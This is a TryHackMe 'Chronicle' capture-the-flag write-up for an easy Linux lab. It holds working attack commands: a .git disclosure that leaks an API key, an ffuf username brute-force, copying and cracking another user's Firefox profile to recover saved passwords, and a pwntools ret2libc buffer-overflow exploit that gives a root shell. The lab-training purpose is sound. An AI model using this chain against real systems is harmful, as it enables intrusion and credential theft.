# Chronicle — TryHackMe Writeup

**Target:** `TARGET_IP` (10.128.189.151 at time of solve)
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Tech stack:** Apache 2.4.29, Werkzeug 1.0.1 (Python 3.6.9), Git
**Exploit chain:** feroxbuster → exposed `.git` in `/old/` → `git show` leaks API key + default creds → ffuf user brute on API → `tommy:DevMakesStuff01` → SSH → `.mozilla` profile exfil from `carlJ` → hashcat mozilla hash → `firefox_decrypt` → `carlJ:Pas$w0RD59247` → SSH as `carlJ` → SUID `smail` binary → buffer overflow → root

---

## Attack Chain Overview

```
nmap → 22, 80 (Apache), 8081 (Werkzeug)
    →
feroxbuster :80 → /old/note.txt, /old/.git
feroxbuster :8081 → /login, /api, /forgot
    →
wget --recursive /old/.git → git show → API key 7454c262d0d5a3a0c0b678d6c0dbc7ef
    →
ffuf user brute on /api/FUZZ → tommy → DevMakesStuff01
    →
ssh tommy@$TARGET → user foothold
    →
/home/carlJ/.mozilla → scp to attacker → mozilla2hashcat → hashcat -m 26100 → password1
    →
firefox_decrypt → carlJ:Pas$w0RD59247
    →
ssh carlJ@$TARGET → ~/mailing/smail (SUID, buffer overflow)
    →
pwntools payload → ret2libc (system + /bin/sh) → root
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration — Dual Servers](#2-web-enumeration--dual-servers)
3. [Git History Disclosure — API Key Recovery](#3-git-history-disclosure--api-key-recovery)
4. [Initial Access — API User Brute-Force + SSH](#4-initial-access--api-user-brute-force--ssh)
5. [User Pivot — Firefox Credential Extraction](#5-user-pivot--firefox-credential-extraction)
6. [Privilege Escalation — SUID Buffer Overflow](#6-privilege-escalation--suid-buffer-overflow)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a full TCP port scan with high performance.
# Why here: discover the attack surface including the Werkzeug service on port 8081.
nmap -sS --min-rate 5000 -Pn -n --open $TARGET -oN silent
nmap -sVC -p22,80,8081 $TARGET -oN service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 7.6p1 |
| 80/tcp | Apache 2.4.29 |
| 8081/tcp | Werkzeug 1.0.1 (Python 3.6.9) |

See [nmap.md](../../tools/recon/nmap.md).

---

## 2. Web Enumeration — Dual Servers

```bash
# What it does: brute-force directories on the Werkzeug API server.
# Why here: discover the /api, /login, and /forgot endpoints on port 8081.
feroxbuster -u http://$TARGET:8081/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -s 200

# What it does: brute-force directories on the Apache server.
# Why here: discover the /old/ directory and its exposed .git repository.
feroxbuster -u http://$TARGET:80/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -s 200
```

Key hits:
- `:80` → `/old/note.txt`, `/old/.git`
- `:8081` → `/login`, `/api`, `/forgot`, `/static/js/forget.js` (API key removed from client-side code)

Users discovered in the old site templates:
```
Jim Gorden, Peyton Warren, Craig Thompson
```

Tools: [feroxbuster](../../tools/fuzz/feroxbuster.md).

---

## 3. Git History Disclosure — API Key Recovery

Full technique: [git-history-disclosure.md](../../exploits/web-disclosure/git-history-disclosure.md).

```bash
# What it does: recursively download the exposed .git directory.
# Why here: recover the full commit history and search for removed secrets.
wget --recursive http://$TARGET/old/.git --continue
```

```bash
# What it does: show the git commit log.
# Why here: identify commits where secrets were added or removed.
cd old && git log

# What it does: display the full diff of the target commit.
# Why here: recover the deleted API key and hardcoded credentials from the diff.
git show cd0375717551c8c8287a53b78b014b7d7e4da3bb
```

Recovered from the deleted diff:
```python
if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
    if(uname=="admin"):
        return '{"username":"admin","password":"password"}'
    elif(uname=="someone"):
        return '{"username":"someone","password":"someword"}'
```

Tools: [git](../../tools/recon/git.md).

---

## 4. Initial Access — API User Brute-Force + SSH

```bash
# What it does: query the API with the recovered key for known users.
# Why here: verify the API key works and retrieve credentials for discovered usernames.
curl -s -X POST http://$TARGET:8081/api/admin \
     -H "Content-Type: application/json" \
     -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}'

curl -s -X POST http://$TARGET:8081/api/someone \
     -H "Content-Type: application/json" \
     -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}'
```

```bash
# What it does: brute-force usernames on the API endpoint.
# Why here: discover additional valid users beyond the hardcoded admin/someone.
ffuf -w /usr/share/wordlists/rockyou.txt -X POST \
     -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' \
     -u http://$TARGET:8081/api/FUZZ -fs 15
# → tommy

# What it does: retrieve tommy's credentials from the API.
# Why here: obtain SSH-ready credentials for the initial foothold.
curl -s -X POST http://$TARGET:8081/api/tommy \
     -H "Content-Type: application/json" \
     -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}'
# {"username":"tommy","password":"DevMakesStuff01"}
```

```bash
# What it does: log in via SSH using the recovered credentials.
# Why here: establish the first interactive foothold on the target.
ssh tommy@$TARGET
```

Tools: [ffuf](../../tools/fuzz/ffuf.md), [curl](../../tools/web/curl.md).

---

## 5. User Pivot — Firefox Credential Extraction

Full technique: [firefox-credential-extraction.md](../../exploits/creds/firefox-credential-extraction.md).

```bash
# What it does: list users with bash shells.
# Why here: identify lateral movement targets (carlJ has a home directory with a .mozilla profile).
cat /etc/passwd | grep bash
# root, carlJ, tommy

# What it does: search for mail directories across the filesystem.
# Why here: check for credential leaks or private communications accessible by tommy.
find / -name "mail" 2>/dev/null
```

The `.mozilla` profile in `/home/carlJ/` is readable by `tommy`:

```bash
# What it does: exfiltrate the Firefox profile to the attacker machine.
# Why here: recover saved browser credentials stored in carlJ's Firefox profile.
scp -r tommy@$TARGET:/home/carlJ/.mozilla /tmp/mozilla

# What it does: extract a hashcat-compatible hash from the Firefox key database.
# Why here: crack the Firefox master password to unlock the saved credentials.
python3 mozilla2hashcat.py 0ryxwn4c.default-release/
# $mozilla$*AES*2436498e0d75ed9f6fb7d119446153fae14ccf8c*...

# What it does: crack the Mozilla password hash.
# Why here: recover the master password needed to decrypt the stored credentials.
hashcat -m 26100 mozilla-hash.txt /usr/share/wordlists/rockyou.txt -O
hashcat mozilla-hash.txt --show
# password1
```

```bash
# What it does: decrypt the Firefox saved credentials using the master password.
# Why here: extract carlJ's stored website password for SSH pivot.
python3 firefox_decrypt.py 0ryxwn4c.default-release/
# Website:   https://incognito.com
# Username: 'dev'
# Password: 'Pas$w0RD59247'
```

```bash
# What it does: log in as carlJ via SSH with the recovered credentials.
# Why here: pivot to a user who owns the SUID binary needed for privilege escalation.
ssh carlJ@$TARGET
```

Tools: [hashcat](../../tools/creds/hashcat.md).

---

## 6. Privilege Escalation — SUID Buffer Overflow

Full technique: [suid-binary-reversing.md](../../exploits/privesc-linux/suid-binary-reversing.md).

ES: En el directorio `mailing` de carlJ hay un binario SUID `smail` que es vulnerable a buffer overflow. Se identificaron las direcciones de `system` y `/bin/sh` dentro de libc para construir un ret2libc.

EN: In carlJ's `mailing` directory, a SUID binary `smail` is vulnerable to buffer overflow. `system` and `/bin/sh` addresses from libc were used to build a ret2libc chain.

```bash
# What it does: check dynamic library dependencies of the binary.
# Why here: identify the libc base address for the ret2libc payload calculation.
ldd smail
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
```

```python
# What it does: craft and send a ret2libc buffer overflow payload.
# Why here: exploit the SUID binary to spawn a root shell via system("/bin/sh").
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh= libc_base + 0x1b3e1a

POPRDI=0x4007f3

payload = b'A' * 72
payload += p64(0x400556)
payload += p64(POPRDI)
payload += p64(binsh)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline("2")
p.clean()
p.sendline(payload)
p.interactive()
```

```bash
# What it does: execute the exploit and read the root flag.
# Why here: complete the privilege escalation and capture the final proof.
python3 payload.py
cd /root/ && cat root.txt
```

---

## 7. Key Takeaways

- Exposed `.git` directories are a goldmine. `git log` + `git show` recover every secret that was ever committed, even if it was later deleted.
- API endpoints behind removed client-side code are still live — always fuzz for undocumented routes and parameters.
- Firefox profiles in user home directories are a lateral-movement primitive. `mozilla2hashcat.py` + `hashcat -m 26100` + `firefox_decrypt.py` is the standard chain.
- SUID binaries that accept user input should always be tested for buffer overflow. `ldd` → libc base → ret2libc is the fastest path when ASLR is off or predictable.
- Browser-stored passwords often reuse the same credential across services — always try the recovered password on SSH/SMB/WinRM.

---

## Related Notes
- [git-history-disclosure.md](../../exploits/web-disclosure/git-history-disclosure.md) — API key recovery
- [firefox-credential-extraction.md](../../exploits/creds/firefox-credential-extraction.md) — user pivot
- [suid-binary-reversing.md](../../exploits/privesc-linux/suid-binary-reversing.md) — root privesc
- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md) — playbook backbone
- [nmap](../../tools/recon/nmap.md), [feroxbuster](../../tools/fuzz/feroxbuster.md), [ffuf](../../tools/fuzz/ffuf.md), [curl](../../tools/web/curl.md), [git](../../tools/recon/git.md), [hashcat](../../tools/creds/hashcat.md)